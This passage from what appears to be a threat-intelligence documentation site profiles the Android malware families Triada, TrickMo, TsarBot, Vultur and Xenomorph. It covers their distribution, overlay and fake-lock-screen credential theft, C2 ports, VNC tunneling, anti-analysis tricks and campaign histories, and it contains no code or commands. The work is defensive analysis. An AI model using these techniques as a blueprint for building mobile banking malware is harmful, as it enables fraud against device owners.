Telegram, and other apps Account theft Steal credentials for social media and messaging applications App installation Download and install arbitrary APKs silently DNS manipulation Redirect network requests by modifying DNS resolution Premium SMS fraud Subscribe victims to premium services via SMS <p>The 2025 variant can attack any application running on the device because it operates at the system level with full privileges.</p>"},{"location":"malware/families/triada/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/triada/#zygote-injection-original","title":"Zygote Injection (Original)","text":"<p>The original Triada's most significant technical innovation was Zygote process injection. Zygote is the Android system process that serves as the template for every application process. When a new app launches, the system forks Zygote to create the new process. By injecting code into Zygote, Triada ensured its code was present in every application on the device, providing:</p> <ul> <li>Access to the memory space of every running application</li> <li>Ability to hook and modify function calls within any app</li> <li>Persistence that survives app-level cleanup (only a system wipe removes it)</li> </ul> <p>This existed primarily in the device's RAM, making file-based detection difficult. Kaspersky noted this was the first time such a technique had been observed in the wild, although it had existed as a proof-of-concept.</p>"},{"location":"malware/families/triada/#system-partition-installation-supply-chain","title":"System Partition Installation (Supply Chain)","text":"<p>In the supply chain variant, Triada is compiled into the system image:</p> <ul> <li>Located in <code>/system</code> partition, which is read-only under normal operation</li> <li>Executes with system-level privileges (UID 1000 or root)</li> <li>Cannot be removed through factory reset because the factory image itself contains the malware</li> <li>Only reflashing with a clean firmware image removes it</li> </ul> <p>Google's analysis described the infection as \"inconspicuously included in the system image as third-party code for additional features requested by the OEMs.\"</p>"},{"location":"malware/families/triada/#c2-communication","title":"C2 Communication","text":"<p>Triada uses HTTPS for C2 communication. The C2 infrastructure delivers:</p> <ul> <li>Module updates and new capabilities</li> <li>Tasking instructions (which ads to display, which SMS to intercept)</li> <li>Additional APKs for installation</li> <li>Configuration updates (target lists, wallet addresses)</li> </ul>"},{"location":"malware/families/triada/#monetization","title":"Monetization","text":"Revenue Stream Method Ad fraud Inject ads into legitimate apps, generate fraudulent impressions Premium SMS Subscribe victims to premium services, intercept confirmation SMS to prevent cancellation Cryptocurrency theft Replace wallet addresses in clipboard during copy-paste operations Credential sale Stolen account credentials sold on underground markets Backdoor access Persistent device access can be sold or leased to other threat actors <p>The 2025 variant's cryptocurrency theft alone generated $270,000 in approximately nine months.</p>"},{"location":"malware/families/triada/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Region Context Period Global (budget devices) Pre-installed on budget Android devices from various manufacturers 2017-2019 Russia (primary) Highest concentration of 2025 variant infections 2024-2025 UK, Netherlands, Germany Secondary infection clusters 2024-2025 Brazil, UAE Additional infection clusters 2024-2025 China (manufacturing) Source of supply chain compromise in OEM firmware 2017-present <p>Unlike targeted spyware, Triada is indiscriminate: anyone who purchases an affected device is compromised. The economic incentive is volume-based fraud rather than intelligence collection.</p>"},{"location":"malware/families/triada/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>March 2016: Kaspersky publishes the initial Triada analysis, identifying it as the most advanced mobile trojan at the time. The Zygote injection technique is documented for the first time in the wild.</p> <p>2017: Triada evolves from a rooting trojan to a supply chain threat. Google begins identifying pre-installed Triada variants on new devices.</p> <p>June 2019: Google's Android security team publishes \"PHA Family Highlights: Triada\", confirming that a third-party vendor (Yehuo/Blazefire) injected Triada into system images during the manufacturing process. Google details how they worked with OEMs to distribute clean updates and implemented the Build Test Suite to scan system images for threats.</p> <p>June 2019: Krebs on Security reports on the supply chain attack, tracing the compromise through the Android OEM ecosystem and highlighting the systemic risk in budget device manufacturing.</p> <p>August 2021: Kaspersky discovered Triada embedded inside a modified WhatsApp build (FMWhatsApp) distributed via third-party app stores, with the trojan injected through a malicious advertising SDK.</p> <p>2019-2023: Multiple security firms continue to identify Triada pre-installed on budget devices from various manufacturers. Google's Build Test Suite catches some instances before devices ship, but the problem persists in devices sold through channels outside Google's certification program.</p> <p>March-April 2025: Kaspersky publishes a comprehensive analysis of the latest Triada variant (Backdoor.AndroidOS.Triada.z), found on counterfeit smartphones. The new version demonstrates expanded capabilities including cryptocurrency theft ($270,000 confirmed), messenger interception, DNS manipulation, and the ability to attack any application on the device. Over 4,500 infections detected across multiple countries.</p>"},{"location":"malware/families/triada/#related-families","title":"Related Families","text":"<p>Necro follows a similar supply chain approach at the SDK level, compromising legitimate apps through the malicious \"Coral SDK\" to reach 11 million+ users on Google Play. Goldoson also used an SDK-based supply chain attack, affecting 60+ apps with 100M+ downloads. While Triada operates at the firmware level, these families demonstrate the same principle: compromising the software supply chain to reach massive install bases without requiring users to install a malicious app.</p>"},{"location":"malware/families/trickmo/","title":"TrickMo","text":"<p>TrickMo is an Android banking trojan originally discovered by CERT-Bund in September 2019 and first analyzed by IBM X-Force in March 2020 as a mobile companion to the TrickBot desktop banking trojan. The original TrickMo functioned as a 2FA bypass tool, intercepting one-time passwords sent via SMS or push notifications to German banking customers whose PCs were already infected with TrickBot. After years of relative quiet, TrickMo resurfaced in 2024 with substantial upgrades. Cleafy documented new variants in September 2024 employing advanced anti-analysis techniques and overlay injection, Cyble reported on its expanded command set and capabilities, and Zimperium identified 40 variants, 16 droppers, and 22 active C2 servers along with a new fake lock screen designed to steal device PINs and unlock patterns.</p>"},{"location":"malware/families/trickmo/#overview","title":"Overview","text":"Attribute Details First Seen September 2019 (CERT-Bund), analyzed March 2020 (IBM X-Force) Status Active, multiple variants in circulation as of late 2024 Type Banking trojan, credential stealer, 2FA bypass Attribution Originally linked to TrickBot operators Distribution Phishing, dropper disguised as Google Chrome"},{"location":"malware/families/trickmo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>TrickMo began as a purpose-built mobile component for the TrickBot ecosystem. IBM X-Force's 2020 analysis documented how TrickBot infections on Windows machines used man-in-the-browser attacks to prompt victims for their mobile phone number and device type, then delivered a fake \"security app\" that was actually TrickMo. The naming convention mirrors ZitMo (Zeus-in-the-Mobile), a similar 2FA-interception companion developed for the Zeus banking trojan in 2011.</p> <p>The original TrickMo exclusively targeted German banking customers and focused narrowly on intercepting SMS and push notification OTPs. The 2024 resurgence represents a dramatic expansion in scope and capability. The malware evolved from a simple OTP interceptor into a full-featured banking trojan with overlay injection, screen recording, device credential theft, and a command set of 45 distinct instructions. The relationship to the original TrickBot group in the 2024 variants remains unclear, as TrickBot's infrastructure was disrupted by law enforcement in 2022.</p>"},{"location":"malware/families/trickmo/#distribution","title":"Distribution","text":"<p>The 2024 TrickMo variants spread through phishing campaigns that deliver a dropper app disguised as Google Chrome. Cleafy documented that the dropper prompts the victim to \"update Google Play Services\" by tapping a confirmation button. Accepting the prompt downloads and installs the TrickMo payload under the name \"Google Services.\"</p> Vector Details Phishing Links delivered via SMS and messaging apps directing victims to malicious downloads Dropper app Disguised as Google Chrome, installs TrickMo as \"Google Services\" Social engineering Fake Google Play Services update prompt triggers payload installation <p>Both the dropper and the payload share the same anti-analysis mechanisms, suggesting coordinated development.</p>"},{"location":"malware/families/trickmo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/trickmo/#core-features","title":"Core Features","text":"Capability Implementation Overlay injection HTML-based fake login pages displayed over targeted banking and crypto apps OTP interception Captures SMS messages and push notifications containing authentication codes Screen recording Records device screen to capture credentials and activity Fake lock screen HTML page mimicking Android unlock screen to steal PIN or pattern Keyguard dismissal Automatically dismisses device lock screen Permission auto-accept Grants itself permissions without user interaction Remote control Operator can interact with the device through accessibility service Notification interception Reads and hides notifications to capture and suppress 2FA codes Data exfiltration Steals credentials, photos, and device information"},{"location":"malware/families/trickmo/#fake-lock-screen","title":"Fake Lock Screen","text":"<p>The fake lock screen is TrickMo's most distinctive 2024 addition. Zimperium's analysis revealed that TrickMo displays an HTML page hosted on an external server in full-screen mode, perfectly mimicking the device's native Android unlock prompt. When the victim enters their PIN or draws their unlock pattern, the page transmits the captured credential along with the device's Android ID to a PHP script on the attacker's server. With the device unlock credential in hand, operators can access the device during periods when the victim is not actively using it, enabling unattended on-device fraud.</p>"},{"location":"malware/families/trickmo/#overlay-injection","title":"Overlay Injection","text":"<p>TrickMo uses HTML overlay pages to phish credentials for targeted applications. Cleafy found that operators had created overlay pages targeting services including Binance, Alpha Bank, and ATB Mobile, among others. When a targeted app moves to the foreground, TrickMo injects a full-screen HTML page over the legitimate interface, capturing any credentials the victim enters.</p>"},{"location":"malware/families/trickmo/#expanded-command-set","title":"Expanded Command Set","text":"<p>Cyble's analysis documented 45 commands supported by the 2024 variants, a substantial increase from the original TrickMo's limited instruction set. The expanded commands cover screen content theft, runtime module downloading, overlay injection management, on-device interaction through accessibility services, and data exfiltration controls.</p>"},{"location":"malware/families/trickmo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/trickmo/#anti-analysis-mechanisms","title":"Anti-Analysis Mechanisms","text":"<p>Cleafy documented two anti-analysis techniques introduced in the 2024 variants.</p> <p>Malformed ZIP files: The APK file is manipulated by adding directories with the same names as critical files such as <code>AndroidManifest.xml</code> and <code>classes.dex</code>. This confuses static analysis tools that attempt to extract and parse the APK, causing decompilation failures in many automated analysis pipelines.</p> <p>JSONPacker: TrickMo uses JSONPacker for payload obfuscation, adding another layer that must be unpacked before analysis can proceed. The combination of malformed ZIP structures and JSONPacker obfuscation creates a multi-layered defense against automated analysis and sandbox detection.</p>"},{"location":"malware/families/trickmo/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Zimperium identified 22 active C2 servers supporting 40 TrickMo variants distributed through 16 distinct droppers. This fragmented infrastructure suggests either multiple operators running independent campaigns or a single group maintaining operational compartmentalization.</p> <p>Cleafy's investigation also exposed misconfigurations in several C2 servers that left 12 GB of exfiltrated victim data accessible without authentication. The exposed data included stolen credentials, personal photos, and device information, indicating the scale of data collection across active campaigns.</p>"},{"location":"malware/families/trickmo/#accessibility-service-dependency","title":"Accessibility Service Dependency","text":"<p>TrickMo relies heavily on the Android accessibility service for its core operations. With accessibility permissions, the malware can monitor foreground applications to trigger overlay injections, intercept and hide notifications, auto-accept permission dialogs, dismiss the device keyguard, record screen content, and interact with UI elements for remote control.</p>"},{"location":"malware/families/trickmo/#target-regions","title":"Target Regions","text":"Phase Period Regions Original 2019-2020 Germany exclusively Resurgence 2024 Canada, UAE, Turkey, Germany <p>The 2024 expansion beyond Germany to Canada, the UAE, and Turkey reflects TrickMo's evolution from a TrickBot companion tool into an independent banking trojan with broader ambitions. Zimperium confirmed at least 13,000 compromised devices across these regions based on data exposed through misconfigured C2 infrastructure, though the actual victim count is likely higher given that not all C2 servers were exposed.</p>"},{"location":"malware/families/trickmo/#notable-campaigns","title":"Notable Campaigns","text":"<p>September 2019: CERT-Bund first identifies TrickMo samples targeting German banking customers. The malware operates as a mobile component of TrickBot, intercepting SMS and push notification OTPs sent by German banks.</p> <p>March 2020: IBM X-Force publishes the first detailed analysis of TrickMo, documenting its role as a 2FA bypass companion to TrickBot. The analysis reveals that TrickBot's Windows infections use man-in-the-browser attacks to socially engineer victims into installing the mobile component.</p> <p>September 2024: Cleafy discloses new TrickMo variants with advanced anti-analysis mechanisms (malformed ZIP files, JSONPacker), overlay injection for banking and cryptocurrency apps, and a dropper disguised as Google Chrome. The investigation also uncovers misconfigured C2 servers leaking 12 GB of stolen victim data.</p> <p>September 2024: Cyble reports on TrickMo's resurgence, documenting the expanded 45-command instruction set, new overlay injection capabilities, screen recording, runtime module downloading, and accessibility-based device control.</p> <p>October 2024: Zimperium publishes a deep dive identifying 40 TrickMo variants, 16 droppers, and 22 C2 servers. The analysis reveals the fake lock screen mechanism for stealing device PINs and unlock patterns, and confirms at least 13,000 compromised devices across Canada, the UAE, Turkey, and Germany.</p>"},{"location":"malware/families/trickmo/#related-families","title":"Related Families","text":"<p>TrickMo's origin as a desktop trojan companion mirrors the ZitMo (Zeus-in-the-Mobile) model from 2011, where mobile malware existed solely to intercept 2FA codes for a PC-based banking trojan. The 2024 TrickMo has outgrown this model entirely, operating as a standalone threat with capabilities rivaling dedicated Android banking trojans.</p> <p>The fake lock screen technique for stealing device unlock credentials parallels TsarBot's LockTypeDetector feature, which similarly deploys a fake lock screen to capture PINs and patterns. Both families use this stolen credential to enable unattended device access for on-device fraud.</p> <p>TrickMo's overlay injection and credential theft approach places it alongside Cerberus, Ermac, Godfather, and Xenomorph in the category of overlay-based banking trojans. The anti-analysis techniques (malformed ZIP, JSONPacker) represent a more sophisticated evasion approach than most families in this category employ.</p> <p>The C2 server misconfiguration that exposed 12 GB of victim data echoes similar operational security failures seen across the Android malware landscape, where rapid deployment and infrastructure scaling often outpace the operators' security practices.</p>"},{"location":"malware/families/tsarbot/","title":"TsarBot","text":"<p>TsarBot is an Android banking trojan discovered by Cyble in March 2025 targeting over 750 applications across banking, finance, cryptocurrency, e-commerce, and social media sectors. It spreads through phishing sites impersonating financial platforms, deploys via a dropper disguised as Google Play Services, and uses overlay attacks combined with on-device fraud capabilities to steal credentials and execute unauthorized transactions. TsarBot communicates with its C2 infrastructure over WebSocket connections across four dedicated ports, supports roughly 30 server-issued commands for real-time device control, and conceals its fraudulent activity behind a black overlay screen.</p>"},{"location":"malware/families/tsarbot/#overview","title":"Overview","text":"Attribute Details First Seen March 2025 Status Active Type Banking trojan, on-device fraud Attribution Suspected Russian-speaking developer Distribution Phishing sites, dropper disguised as Google Play Services"},{"location":"malware/families/tsarbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble's analysis identified Russian-language log entries within the malware, suggesting a Russian-speaking developer or team. The name \"TsarBot\" reflects this suspected origin. TsarBot arrived as a capable threat from its first observed samples, with a broad target list spanning multiple continents and application categories from the outset.</p> <p>The overlay-based credential theft approach places TsarBot in the same operational category as families like Cerberus, Ermac, and Hook, though no direct code lineage to these families has been established. TsarBot's WebSocket-based C2 architecture and dedicated port structure differentiate it from the HTTP-based communication patterns common in older banking trojan families.</p>"},{"location":"malware/families/tsarbot/#distribution","title":"Distribution","text":"<p>TsarBot spreads through phishing sites that impersonate legitimate financial platforms. Cyble observed one campaign using a phishing site mimicking the Photon Sol token trading platform, offering a fake download option that the legitimate site does not provide. The downloaded dropper disguises itself as Google Play Services and installs the TsarBot payload.</p> Vector Details Phishing sites Fake financial platform websites offering malicious APK downloads Dropper Disguised as Google Play Services to appear legitimate Social engineering Lures tied to cryptocurrency trading and financial services"},{"location":"malware/families/tsarbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/tsarbot/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks Fake login pages over 750+ banking, crypto, e-commerce, and social media apps Screen capture Streams screen content to C2 via WebSocket on port 9002 Remote device control Simulates taps, swipes, and credential entry for on-device fraud Black overlay screen Hides fraudulent on-screen activity from the victim Lock grabbing Captures device unlock PIN, password, or pattern via fake lock screen Keylogging Records keystrokes including usernames, passwords, and card details SMS interception Captures incoming SMS messages including 2FA codes On-device fraud Executes unauthorized transactions directly on the compromised device"},{"location":"malware/families/tsarbot/#overlay-attacks","title":"Overlay Attacks","text":"<p>TsarBot's primary credential theft mechanism uses overlay attacks targeting over 750 applications. The target list spans regional banking apps from countries including France, Poland, the United Kingdom, India, the UAE, and Australia, along with global cryptocurrency exchanges, e-commerce platforms, and social media applications. When a targeted app launches, TsarBot displays a pixel-perfect fake login page on top of the legitimate app, capturing credentials as the victim enters them.</p>"},{"location":"malware/families/tsarbot/#lock-grabbing","title":"Lock Grabbing","text":"<p>TsarBot includes a LockTypeDetector feature that uses the accessibility service to determine the device's lock type by detecting on-screen text such as \"PIN area,\" \"Device password,\" or pattern indicators. On the first <code>USER_PRESENT</code> broadcast after installation, TsarBot loads a fake lock screen matching the detected lock type and captures the victim's unlock credential. This stolen PIN, password, or pattern enables the operator to unlock the device during remote access sessions.</p>"},{"location":"malware/families/tsarbot/#on-device-fraud","title":"On-Device Fraud","text":"<p>TsarBot can execute fraudulent transactions directly on the victim's device rather than replaying stolen credentials from a separate system. The malware receives approximately 30 commands from the C2 server focused on screen control: simulating gestures, entering text, navigating through banking app workflows, and initiating transfers. During these sessions, TsarBot activates a black overlay screen to hide the activity from the victim, who sees only a dark display and assumes the device is idle.</p>"},{"location":"malware/families/tsarbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/tsarbot/#websocket-c2-architecture","title":"WebSocket C2 Architecture","text":"<p>TsarBot's C2 communication is built entirely on WebSocket, distinguishing it from most Android banking trojans that rely on HTTP or HTTPS. The malware connects to the C2 server across four dedicated ports, each serving a specific function.</p> Port Function 9001 Primary command channel for receiving instructions and sending stolen data 9002 Screen capture stream transmission 9004 Overlay attack coordination and injection target delivery 9030 Additional command and data channel <p>This multi-port WebSocket design enables persistent, low-latency bidirectional communication between the malware and the operator, supporting real-time screen streaming and interactive device control required for on-device fraud.</p>"},{"location":"malware/families/tsarbot/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>TsarBot depends on the Android accessibility service for most of its core functionality. Once the victim grants accessibility permissions, the malware can monitor foreground applications to trigger overlay injections, detect and interact with UI elements for automated fraud, capture keystrokes, determine device lock type, and intercept notifications containing authentication codes.</p>"},{"location":"malware/families/tsarbot/#screen-capture","title":"Screen Capture","text":"<p>When the C2 sends the <code>REQUEST_CAPTURE</code> command, TsarBot prompts the victim to grant screen capture permissions. Once authorized, the malware initiates a screen capture service that continuously streams the device's display to the C2 server over port 9002. This gives the operator a live view of the device for monitoring victim activity and guiding on-device fraud sessions.</p>"},{"location":"malware/families/tsarbot/#target-regions","title":"Target Regions","text":"Region Targeted Sectors Europe Banking apps in France, Poland, United Kingdom Asia-Pacific Banking and finance apps in India, Australia Middle East Banking apps in the UAE North America Banking, finance, and crypto apps Global Cryptocurrency exchanges, e-commerce, social media platforms <p>The breadth of TsarBot's target list, spanning six continents and multiple industry verticals from its first observed samples, suggests operators with established infrastructure and the intent to scale rapidly. The inclusion of social media and e-commerce alongside traditional banking targets expands the monetization surface beyond pure financial fraud.</p>"},{"location":"malware/families/tsarbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2025: Cyble publishes the initial discovery of TsarBot. The analysis identifies over 750 targeted applications, documents the WebSocket-based C2 architecture across four ports, and details the overlay injection, lock grabbing, screen recording, and on-device fraud capabilities. Cyble highlights a phishing campaign impersonating the Photon Sol cryptocurrency trading platform as a distribution vector, with the dropper masquerading as Google Play Services.</p>"},{"location":"malware/families/tsarbot/#related-families","title":"Related Families","text":"<p>TsarBot's overlay attack model follows the pattern established by Cerberus and continued through Ermac, Hook, and Godfather, all of which use fake login pages injected over targeted banking applications. However, TsarBot's WebSocket C2 design is a departure from the HTTP-based approaches used by most of these families.</p> <p>The on-device fraud capability, where the malware executes transactions directly on the compromised device rather than replaying stolen credentials elsewhere, aligns TsarBot with families like Octo and Hook that also support real-time remote access and interactive device control. The black overlay screen used to conceal fraud sessions is a technique shared with Octo, Hook, and Crocodilus.</p> <p>TsarBot's lock grabbing via fake lock screens is a technique also employed by TrickMo, which uses a similar HTML-based fake unlock screen to capture device PINs and patterns.</p>"},{"location":"malware/families/vultur/","title":"Vultur","text":"<p>Vultur is an Android banking trojan that pioneered real-time screen streaming over VNC as its primary credential-theft mechanism, deliberately avoiding the overlay injection approach used by every other banking trojan at the time. Discovered by ThreatFabric in March 2021, Vultur uses AlphaVNC for screen recording and ngrok for tunneling the VNC connection through NATs and firewalls. Its 2024 update added extensive accessibility-based remote control, file management, and app blocking capabilities, while maintaining the VNC core. Distribution relies on the Brunhilda dropper-as-a-service (DaaS) operation and, more recently, TOAD (telephone-oriented attack delivery) combining smishing with voice phishing.</p>"},{"location":"malware/families/vultur/#overview","title":"Overview","text":"Attribute Details First Seen March 2021 Status Active (2024 update) Type Banking trojan, RAT, screen streaming Aliases None widely used Attribution Distributed via Brunhilda DaaS; operator unknown Distribution Google Play (Brunhilda droppers), smishing + TOAD"},{"location":"malware/families/vultur/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Vultur in late March 2021 and named it for the \"full visibility\" it grants operators over victim devices through VNC. At the time, every Android banking trojan relied on overlay injection as the primary credential-theft technique. Vultur broke this pattern by recording the screen in real time, capturing whatever the user typed into any app without needing app-specific inject templates.</p> <p>Vultur has no known code-level relationship to other banking trojan families. Its connection to the Brunhilda dropper operation provides the distribution layer: ThreatFabric documented Brunhilda as a DaaS that places trojanized utility apps on Google Play to deliver various banking trojan payloads, including Vultur.</p> <p>NCC Group's Fox-IT published an updated analysis in March 2024 documenting a significant new version with expanded remote control capabilities, encrypted payloads, and a shift toward TOAD-based distribution.</p>"},{"location":"malware/families/vultur/#distribution","title":"Distribution","text":""},{"location":"malware/families/vultur/#brunhilda-droppers-2021-2023","title":"Brunhilda Droppers (2021-2023)","text":"<p>Vultur's primary distribution channel has been the Brunhilda DaaS, which places dropper apps on Google Play disguised as authenticator tools, productivity apps, and fitness trackers.</p> Date Dropper Disguise Installs Source 2021 Authenticator, fitness apps 5,000+ ThreatFabric 2022 Various utility apps Thousands ThreatFabric"},{"location":"malware/families/vultur/#toad-distribution-2024","title":"TOAD Distribution (2024)","text":"<p>The 2024 version shifted to a social engineering chain combining SMS and voice calls:</p> <ol> <li>Victim receives an SMS about an unauthorized transaction</li> <li>SMS instructs the victim to call a provided number</li> <li>A human operator (the attacker) answers and persuades the victim to \"secure their account\"</li> <li>A second SMS arrives with a download link</li> <li>The link serves a trojanized McAfee Security app containing the Vultur payload</li> </ol> <p>Fox-IT documented this TOAD chain, noting the McAfee impersonation and the multi-stage social engineering as a significant evolution from passive Play Store dropper distribution.</p>"},{"location":"malware/families/vultur/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/vultur/#version-evolution","title":"Version Evolution","text":"Version Period Key Capabilities v1 March 2021 AlphaVNC screen streaming, ngrok tunneling, accessibility keylogging v2 (2024 update) March 2024 All v1 + accessibility remote control, file manager, app blocking, encrypted C2, encrypted payloads"},{"location":"malware/families/vultur/#v1-core-screen-streaming","title":"v1 Core (Screen Streaming)","text":"Capability Implementation Screen recording AlphaVNC server running on-device Remote tunneling ngrok exposes VNC server through NAT/firewall Keylogging Accessibility service captures text input events Target detection Accessibility monitors foreground app, starts recording when target opens SMS interception Reads incoming SMS for 2FA codes <p>The VNC approach means Vultur captures credentials from any app, not just those with pre-built overlay templates. When the accessibility service detects a target app in the foreground, Vultur starts a VNC recording session. The operator watches the session in real time through the ngrok tunnel.</p>"},{"location":"malware/families/vultur/#v2-additions-2024","title":"v2 Additions (2024)","text":"<p>Fox-IT's analysis documented 7 new C2 methods and 41 new Firebase Cloud Messaging (FCM) commands in the updated version:</p> Capability Implementation Accessibility remote control Taps, scrolls, swipes via accessibility service (supplements VNC) File manager Download, upload, delete, find, install files App blocking Prevent specified apps from launching Keyguard control Disable device lock screen Custom notifications Display attacker-crafted notifications to lure user interaction Encrypted C2 AES-encrypted command and control communication Multi-payload loading Three payloads (2 APKs + 1 DEX) decoded and loaded sequentially <p>The 2024 version retains AlphaVNC and ngrok but adds accessibility-based remote interaction as a parallel control mechanism. This gives operators two modes: passive observation through VNC streaming and active device manipulation through accessibility commands.</p>"},{"location":"malware/families/vultur/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/vultur/#alphavnc-integration","title":"AlphaVNC Integration","text":"<p>Vultur embeds a real VNC server implementation taken from the AlphaVNC project. The VNC server runs as a background service, capturing the device screen and serving it over a local VNC port.</p>"},{"location":"malware/families/vultur/#ngrok-tunneling","title":"ngrok Tunneling","text":"<p>Since the VNC server is bound to localhost on the infected device, the malware uses ngrok to create a tunnel:</p> <ol> <li>Vultur starts the AlphaVNC server on a local port</li> <li>ngrok client connects to ngrok's relay infrastructure</li> <li>The relay assigns a public endpoint that forwards traffic to the local VNC port</li> <li>The operator connects to the public ngrok endpoint with a VNC client</li> </ol> <p>This avoids the need for the device to have a public IP or for the C2 to handle VNC relay directly.</p>"},{"location":"malware/families/vultur/#c2-communication","title":"C2 Communication","text":"<p>v1:</p> Component Details Protocol HTTPS for commands, ngrok for VNC Bot registration Device info, installed apps, country code sent at registration Commands Start/stop recording, keylogger toggle, SMS interception config <p>v2 (2024):</p> Component Details Protocol HTTPS with AES encryption Push channel Firebase Cloud Messaging (41 commands) C2 methods 7 new methods for file operations, app blocking, notification control Payload delivery 3-stage: 2 APKs + 1 DEX file, each encrypted Obfuscation Multiple encrypted payloads decrypted at runtime, legitimate app disguise"},{"location":"malware/families/vultur/#payload-structure-v2","title":"Payload Structure (v2)","text":"<p>The 2024 dropper (McAfee Security impersonation) executes three payloads in sequence:</p> <ol> <li>First APK: Registers the bot with C2, establishes initial communication</li> <li>Second APK: Obtains accessibility service permissions, sets up AlphaVNC and ngrok</li> <li>DEX file: Provides additional commands, fetched and executed from C2</li> </ol>"},{"location":"malware/families/vultur/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Region Details Italy Largest number of targeted banking apps Australia Second-highest target concentration Spain Significant banking app targeting UK Added in later campaigns <p>Vultur's VNC-based approach means any app on the device is effectively a target, since the operator sees exactly what the user sees. The formal \"target list\" determines when recording sessions start automatically, but operators can initiate recording at any time.</p>"},{"location":"malware/families/vultur/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2021: ThreatFabric disclosed Vultur as the first Android banking trojan to use VNC-based screen recording instead of overlay injection. Initial campaigns targeted Italian, Australian, and Spanish banks, distributed through Brunhilda dropper apps on Google Play with 5,000+ installs.</p> <p>November 2021: ThreatFabric documented the Brunhilda dropper ecosystem, identifying Vultur as one of multiple banking trojans delivered through the DaaS operation alongside Alien and other families.</p> <p>2022-2023: Vultur maintained steady operations through Brunhilda droppers on Google Play. Multiple dropper apps were identified and removed in successive rounds, with the operators consistently uploading new variants.</p> <p>March 2024: NCC Group's Fox-IT published detailed analysis of Vultur's major update. The new version added 7 C2 methods, 41 FCM commands, file management, app blocking, and encrypted communications. Distribution shifted to TOAD: a smishing + voice phishing chain delivering a trojanized McAfee Security app.</p> <p>April 2024: Bleeping Computer reported on the McAfee impersonation campaign, noting the sophistication of the TOAD delivery chain where human operators guided victims through the installation process.</p>"},{"location":"malware/families/xenomorph/","title":"Xenomorph","text":"<p>Xenomorph is an Android banking trojan developed by the Hadoken Security Group, notable for its rapid feature iteration across three major versions between February 2022 and mid-2023. Version 3 introduced a full ATS (Automated Transfer System) engine powered by a JSON-based scripting runtime that executes fraud workflows autonomously on the victim's device. With 400+ targeted financial institutions spanning multiple continents, Xenomorph represents the trajectory of modern Android bankers: fast development cycles, MaaS ambitions, and increasingly autonomous on-device fraud.</p>"},{"location":"malware/families/xenomorph/#overview","title":"Overview","text":"Attribute Details First Seen February 2022 Status Active (2024) Type Banking trojan, ATS fraud Aliases Xenomorph.A (v1), Xenomorph.B (v2), Xenomorph.C (v3) Attribution Hadoken Security Group Distribution Google Play (via GymDrop, Zombinder), direct download"},{"location":"malware/families/xenomorph/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Xenomorph in February 2022 on the Google Play Store, where it had accumulated over 50,000 downloads through a dropper disguised as a \"Fast Cleaner\" utility. At discovery, ThreatFabric noted code overlaps with the Alien banking trojan (itself a Cerberus derivative), suggesting the authors studied or borrowed from that codebase.</p> <p>In May 2022, the Hadoken Security Group publicly claimed ownership of Xenomorph and their dropper operation GymDrop on a dark web forum. ThreatFabric attributed both products to the same group, which had been active since at least late 2021 with GymDrop as their initial offering.</p> <p>ThreatFabric also linked BugDrop to Hadoken, a dropper designed to bypass Android 13's restrictions on sideloaded apps requesting accessibility permissions. BugDrop was found in development in August 2022, indicating the group's investment in solving the distribution pipeline alongside the payload itself.</p>"},{"location":"malware/families/xenomorph/#distribution","title":"Distribution","text":"<p>Xenomorph distribution has rotated through multiple dropper services:</p> Period Distribution Method Details Feb 2022 GymDrop on Google Play \"Fast Cleaner\" app, 50,000+ installs Late 2022 Zombinder Payload bound to legitimate currency converter app 2023 Zombinder, direct download Zombinder operators later claimed to shut down Late 2023 Direct distribution sites Fake Chrome/Play Store download pages <p>GymDrop: Hadoken's own dropper operation, managed in-house. Dropper apps on Google Play fetch and install the Xenomorph payload after the initial app passes review.</p> <p>Zombinder: A third-party service that \"binds\" malicious payloads to legitimate APKs. ThreatFabric covered Zombinder in December 2022, documenting how Xenomorph was delivered via a currency converter app that downloaded a fake \"Google Protect\" update containing the actual payload.</p>"},{"location":"malware/families/xenomorph/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/xenomorph/#version-evolution","title":"Version Evolution","text":"Version Date Target Count Key Features v1 (Xenomorph.A) Feb 2022 56 Overlay injection, notification/SMS interception v2 (Xenomorph.B) Jun 2022 ~100 Complete code rewrite, modular architecture, limited wild activity v3 (Xenomorph.C) Mar 2023 400+ Full ATS engine, JSON scripting runtime, cookie stealing, MFA bypass"},{"location":"malware/families/xenomorph/#v1-capabilities","title":"v1 Capabilities","text":"Capability Implementation Overlay injection WebView-based injects for 56 EU banking apps SMS interception Reads and intercepts incoming SMS for 2FA Notification interception Captures notification content via accessibility App listing Reports installed apps to C2 for target matching <p>v1 lacked accessibility logging, remote actions, and any form of ATS. It was a basic overlay banker with limited scope.</p>"},{"location":"malware/families/xenomorph/#v2-architecture","title":"v2 Architecture","text":"<p>ThreatFabric noted that v2 (June 2022) was a complete rewrite that made the codebase modular and extensible. It saw only brief testing bursts in the wild, suggesting it served as a transitional build preparing the architecture for v3's feature set.</p>"},{"location":"malware/families/xenomorph/#v3-ats-engine","title":"v3 ATS Engine","text":"<p>The v3 ATS framework is Xenomorph's defining feature. It operates as a JSON-scripted runtime engine powered by accessibility services:</p> <ol> <li>The C2 sends JSON scripts defining sequences of actions</li> <li>Xenomorph parses the JSON into an ordered list of operations</li> <li>Each operation maps to an accessibility action (tap, swipe, text input, wait, conditional check)</li> <li>The engine executes operations sequentially, handling banking app navigation, credential entry, transfer initiation, and confirmation</li> <li>Third-party authenticator app content is read via accessibility to bypass MFA</li> </ol> <p>The scripting approach means operators can define new fraud workflows without updating the malware binary. Target-specific scripts handle the unique UI flow of each banking 